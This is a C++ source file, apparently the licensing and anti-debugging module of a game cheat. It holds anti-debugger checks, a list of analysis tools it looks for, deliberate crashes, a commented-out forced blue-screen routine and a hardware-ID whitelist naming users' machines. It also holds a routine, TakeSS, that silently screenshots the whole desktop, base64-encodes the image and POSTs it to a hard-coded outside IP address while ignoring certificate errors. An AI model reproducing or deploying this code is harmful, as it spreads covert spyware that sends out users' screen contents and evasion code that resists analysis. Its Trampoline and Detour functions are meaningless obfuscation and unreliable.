#include "HWID.h"
#include <TlHelp32.h>
#include  "Options.h"
#include <WinInet.h>
#include <gdiplus.h>
cSecurity* g_pSecurity = new cSecurity;
cSecurity::cSecurity()
{
	buf1 = NULL;
	buf2 = NULL;
	User = "null";
}
DWORD GetProcessIdByName(LPCTSTR name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &pe32)) {
			do {
				std::string sName = pe32.szExeFile;
				std::transform(sName.begin(), sName.end(), sName.begin(), ::tolower);

				if (!lstrcmp(sName.c_str(), name)) {
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &pe32));
		}

		CloseHandle(snapshot);
	}

	return pid;
}


inline BOOL CanOpenCsrss()
{
	HANDLE hCsrss = 0;

	hCsrss = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(XorStr("csrss.exe")));

	if (hCsrss != NULL)
	{
		CloseHandle(hCsrss);
		return TRUE;
	}
	else
		return FALSE;

}

inline bool Int2DCheck()
{
	__try
	{
		__asm
		{
			int 0x2d
			xor eax, eax
			add eax, 2
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

inline bool IsDbgPresentPrefixCheck()
{
	__try
	{
		__asm __emit 0xF3 // 0xF3 0x64 disassembles as PREFIX REP:
		__asm __emit 0x64
		__asm __emit 0xF1 // One byte INT 1
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

inline bool checkGlobalFlags()
{
	DWORD NtGlobalFlags;
	__asm
	{
		mov eax, fs:[30h]
		mov eax, [eax + 68h]
		mov NtGlobalFlags, eax
	}

	if (NtGlobalFlags & 0x70)
		return true;

	return false;
}
inline uint16_t cSecurity::hashMacAddress(PIP_ADAPTER_INFO info)
{
	uint16_t hash = 0;
	for (auto i = 0; i < info->AddressLength; i++)
	{
		hash += (info->Address[i] << ((i & 1) * 8));
	}
	return hash;
}
inline void walkProcessList()
{
	std::vector<std::string> m_processList;
	m_processList.push_back(XorStr("ollydbg.exe"));
	m_processList.push_back(XorStr("wireshark.exe"));
	m_processList.push_back(XorStr("lordpe.exe"));
	m_processList.push_back(XorStr("hookshark.exe"));
	m_processList.push_back(XorStr("idag.exe"));
	m_processList.push_back(XorStr("MPGH Virus Scan Tool v6.exe"));

	for (unsigned int ax = 0; ax < m_processList.size(); ax++)
	{
		std::string sProcess = m_processList.at(ax);
		if (GetProcessIdByName(sProcess.c_str()) != 0)
		{
			Options.Cheat.Uninject = true;
		}
	}
}

inline void doChecks()
{
	if (GetProcessIdByName(XorStr("TeamViewer.exe")) != 0)
	{
		MessageBox(0, XorStr("Close Teamviewer"),XorStr("TeamViewer"), 0);
		Options.Cheat.Uninject = true;
		int* p = 0;
		*p = 0;
	}

	HANDLE hModule = GetModuleHandle(XorStr("tv_w32.dll"));

	if (hModule != 0)
	{
		MessageBox(0, XorStr("Please close Teamviewer"), XorStr("TeamViewer"), 0);
		Options.Cheat.Uninject = true;
		int* p = 0;
		*p = 0;
	}

	walkProcessList();

	if (Int2DCheck() || IsDbgPresentPrefixCheck())
		Options.Cheat.Uninject = true;

	if (checkGlobalFlags())
		Options.Cheat.Uninject = true;

}
inline void cSecurity::getMacHash(uint16_t& mac1, uint16_t& mac2)
{
	IP_ADAPTER_INFO AdapterInfo[32];
	DWORD dwBufLen = sizeof(AdapterInfo);
	auto dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus != ERROR_SUCCESS)
		return;
	auto pAdapterInfo = AdapterInfo;
	mac1 = hashMacAddress(pAdapterInfo);
	if (pAdapterInfo->Next)
		mac2 = hashMacAddress(pAdapterInfo->Next);
	if (mac1 > mac2)
	{
		auto tmp = mac2;
		mac2 = mac1;
		mac1 = tmp;
	}
}

inline uint16_t cSecurity::getVolumeHash()
{
	DWORD serialNum = 0;
	GetVolumeInformation("c:\\", nullptr, 0, &serialNum, nullptr, nullptr, nullptr, 0);
	auto hash = static_cast<uint16_t>((serialNum + (serialNum >> 16)) & 0xFFFF);
	return hash;
}

inline uint16_t cSecurity::getCpuHash()
{
	int cpuinfo[4] = { 0, 0, 0, 0 };
	__cpuid(cpuinfo, 0);
	uint16_t hash = 0;
	auto ptr = reinterpret_cast<uint16_t*>(&cpuinfo[0]);
	for (auto i = 0; i < 8; i++)
		hash += ptr[i];
	return hash;
}

inline const char* cSecurity::getMachineName()
{
	static char computerName[1024];
	DWORD size = 1024;
	GetComputerName(computerName, &size);
	return &(computerName[0]);
}
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivlege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
/*inline void cSecurity::InvokeBSOD()
{
	BOOLEAN bBuf;
	ULONG response;
	RtlAdjustPrivlege(19, true, false, &bBuf);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, NULL, NULL, nullptr, NULL, &response);
}*/
Info_t Info[15];

inline void cSecurity::SetInfo(void)
{
	Info[Truix].Name = "TRUIX-PC";
	Info[Truix].Volume = 0xB7DC;
	Info[Truix].Mac = 0xB633;
	Info[Truix].Extra = 0xCCCC;
	Info[Truix].User = "Senpai";

	Info[TruixLAP].Name = "LAPTOP-VPO5NDH7";
	Info[TruixLAP].Volume = 0x000826;
	Info[TruixLAP].Mac = 0x003502;
	Info[TruixLAP].Extra = 0x003602;
	Info[TruixLAP].User = "Senpai - Laptop";

	Info[RWBY].Name = "DESKTOP-BM4A64J";
	Info[RWBY].Volume = 0x6425;
	Info[RWBY].Mac = 0xC03A;
	Info[RWBY].Extra = 0xEFA1;
	Info[RWBY].User = "Azay";

	Info[Salasta].Name = "DICK-CHAPPY-EXT";
	Info[Salasta].Volume = 0x3B58;
	Info[Salasta].Mac = 0x7C5;
	Info[Salasta].Extra = 0x97E5;
	Info[Salasta].User = "Salasta";

	Info[Bizzy].Name = "BLUE12";
	Info[Bizzy].Volume = 0x3119;
	Info[Bizzy].Mac = 0x2110;
	Info[Bizzy].Extra = 0xCE02;
	Info[Bizzy].User = "Bizzy";

	Info[Visual].Name = "MASTERCONTROL";
	Info[Visual].Volume = 0xC492;
	Info[Visual].Mac = 0x21D6;
	Info[Visual].Extra = 0x9948;
	Info[Visual].User = "Visual";

	Info[Shortie].Name = "MARK-PC";
	Info[Shortie].Volume = 0xD82B;
	Info[Shortie].Mac = 0xBD5F;
	Info[Shortie].Extra = 0xE9E4;
	Info[Shortie].User = "Shortie";

	Info[N9ne].Name = "DESKTOP-9T4MBQ7";
	Info[N9ne].Volume = 0xF930;
	Info[N9ne].Mac = 0xB3DE;
	Info[N9ne].Extra = 0xC319;
	Info[N9ne].User = "99";

	Info[Zer0].Name = "KEVIN";
	Info[Zer0].Volume = 0xF40E;
	Info[Zer0].Mac = 0x81CD;
	Info[Zer0].Extra = 0x9296;
	Info[Zer0].User = "Zer0";
	
	Info[Agent].Name = "SHAWNPC";
	Info[Agent].Volume = 0xf280;
	Info[Agent].Mac = 0x81CD;
	Info[Agent].Extra = 0x9296;
	Info[Agent].User = "Dont Reverse My pCheat";

	Info[SoundWave].Name = "THE-RAPTOR";
	Info[SoundWave].Volume = 0x62E0;
	Info[SoundWave].Mac = 0x8FC1;
	Info[SoundWave].Extra = 0x935B;
	Info[SoundWave].User = "With one button I can turn all of them off!";

	Info[Eclipse].Name = "DESKTOP-T7VT56P";
	Info[Eclipse].Volume = 0xCE89;
	Info[Eclipse].Mac = 0xA1E9;
	Info[Eclipse].Extra = 0xC51C;
	Info[Eclipse].User = "Yehink aka my fuckboi.";

	Info[Cid].Name = "XCWB-1";
	Info[Cid].Volume = 0xFF46;
	Info[Cid].Mac = 0x5C03;
	Info[Cid].Extra = 0x81CD;
	Info[Cid].User = "cid";

	Info[Hilley].Name = "HILLEYSINHO";
	Info[Hilley].Volume = 0xAABC;
	Info[Hilley].Mac = 0xD5C;
	Info[Hilley].Extra = 0xA796;
	Info[Hilley].User = "Hilley";

	Info[CASE].Name = "BLAIN";
	Info[CASE].Volume = 0x76E4;
	Info[CASE].Mac = 0x7B74;
	Info[CASE].Extra = 0xFEC4;
	Info[CASE].User = "Case";

}
void TakeSS();
inline bool cSecurity::Authenticate()
{
	SetInfo();
	getMacHash(buf1, buf2);
	auto Names = getMachineName();
	auto Hash = getVolumeHash();
	//auto CPU = getCpuHash();
	User = "Not-Valid";

	for (auto i = 0; i <= 14; i++)
	{
		if 	( Hash == NULL
			|| !strcmp("null", Names))
			continue;
		if (strcmp(Info[i].Name, Names))
			continue;
		if (!(Info[i].Volume == Hash))
			continue;
		User = Info[i].User;
		return true;
	}
	return false;
}

bool cSecurity::Trampoline(bool tram = false, int set = 7)
{
	if (!tram || set != 0)
		Trampoline(tram, set);
	else
		if (Detour(false, 6556156165615))
			return true;
	return false;
}

bool cSecurity::Detour(bool detour = true, int max = 0)
{
	if (!max)
		Detour();
	if (detour)
		Detour();

	if (!detour && max)
		if (BackroundWorker(false))
			return true;
}
static bool one = true;
bool cSecurity::BackroundWorker(bool Invalid = true)
{
	//doChecks();
	uint16_t buffer, buffer2;
	SetInfo();
	getMacHash(buffer, buffer2);
	if (one)
	{
		TakeSS();
		one = false;
	}
	auto Names = getMachineName();
	auto Hash = getVolumeHash();
	for (auto i = 0; i <= 14; i++)
	{
		if (Hash == NULL
			|| !strcmp("null", Names))
			continue;
		if (strcmp(Info[i].Name, Names))
			continue;
		if (!(Info[i].Volume == Hash))
			continue;
		User = Info[i].User;
		return true;
	}
	if (Invalid)
		return false;
	BackroundWorker();
}
inline void Request(int Method, LPCSTR Host, LPCSTR url, LPCSTR header, const char* data)
{
	try {
		//Retrieve default http user agent
		char httpUseragent[512] = "Truix/Karma (compatible; 343b6c1b7e84983ac70e753df0c2f419; f8060bf04029e2a87e9a638750d62189; Windows NT 6.2; WOW64;)";
		//DWORD szhttpUserAgent = sizeof(httpUseragent);
		//ObtainUserAgentString(0, httpUseragent, &szhttpUserAgent);
		char m[5];

		if (Method == GET)
			strcpy(m, "GET\0");
		else
			strcpy(m, "POST\0");

		HINTERNET internet = InternetOpenA(httpUseragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (internet != NULL)
		{
			HINTERNET connect = InternetConnectA(internet, Host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			if (connect != NULL)
			{
				HINTERNET request = HttpOpenRequestA(connect, m, url, "HTTP/1.1", NULL, NULL,
					INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
					INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
					INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
					INTERNET_FLAG_NO_AUTH |
					INTERNET_FLAG_NO_CACHE_WRITE |
					INTERNET_FLAG_NO_UI |
					INTERNET_FLAG_PRAGMA_NOCACHE |
					INTERNET_FLAG_RELOAD, NULL);

				if (request != NULL)
				{
					int datalen = 0;
					if (data != NULL) datalen = strlen(data);
					int headerlen = 0;
					if (header != NULL) headerlen = strlen(header);

					HttpSendRequestA(request, header, headerlen, (char*)data, datalen);
					InternetCloseHandle(request);
				}
			}
			InternetCloseHandle(connect);
		}
		InternetCloseHandle(internet);
	}
	catch (...) {}

}
std::string ReadFileIntoByteArray(PCHAR fileName)
{
	std::string sNoob;
	size_t iLen;
	std::ifstream fl(fileName, std::ios::binary);

	if (fl)
	{
		fl.seekg(0, std::ios::end);

		iLen = fl.tellg();

		sNoob.reserve(iLen);

		fl.seekg(0, std::ios::beg);

		sNoob.assign((std::istreambuf_iterator<char>(fl)),
			std::istreambuf_iterator<char>());

		fl.close();
	}


	return sNoob;
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0; // number of image encoders
	UINT size = 0; // size of the image encoder array in bytes

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
	{
		return -1; // Failure
	}

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
	{
		return -1; // Failure
	}

	Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j; // Success
		}
	}

	free(pImageCodecInfo);
	return -1; // Failure
}
void BitmapToJpg(HBITMAP hbmpImage, int width, int height)
{
	Gdiplus::Bitmap *p_bmp = Gdiplus::Bitmap::FromHBITMAP(hbmpImage, NULL);
	//Bitmap *p_bmp = new Bitmap(width, height, PixelFormat32bppARGB);
	CLSID pngClsid;
	int result = GetEncoderClsid(L"image/jpeg", &pngClsid);
	if (result != -1)
		std::cout << "Encoding succeeded" << std::endl;
	else
		std::cout << "Encoding failed" << std::endl;
	p_bmp->Save(L"screen.jpg", &pngClsid, NULL);

	//SetFileAttributes("screen.jpg", FILE_ATTRIBUTE_HIDDEN);

	delete p_bmp;
}
bool ScreenCapture(int x, int y, int width, int height, char *filename)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
	BitmapToJpg(hBmp, width, height);
	DeleteObject(hBmp);
	return true;
}
void TakeSS()
{
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR           gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	int x1 = 0;
	int y1 = 0;
	int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	ScreenCapture(x1, y1, x2 - x1, y2 - y1, "screen.jpg");
	std::string sScreen = ReadFileIntoByteArray("screen.jpg");
	std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(sScreen.c_str()), sScreen.length());
	std::string data = "user=" + std::string(g_pSecurity->User) + "&img=" + encoded.c_str();
	Gdiplus::GdiplusShutdown(gdiplusToken);
	Request(POST, XorStr("149.56.170.149"), XorStr("/screen/asscaps.php"), XorStr("Content-Type: application/x-www-form-urlencoded"), data.c_str());
}
bool cSecurity::RunSecurityChecks()
{
	//doChecks();
	if (Authenticate())
		return true;//how it is rn, I patched it with two bytes ssoooooooooooooooooooooooooooooo fix it soon
	return false;
}

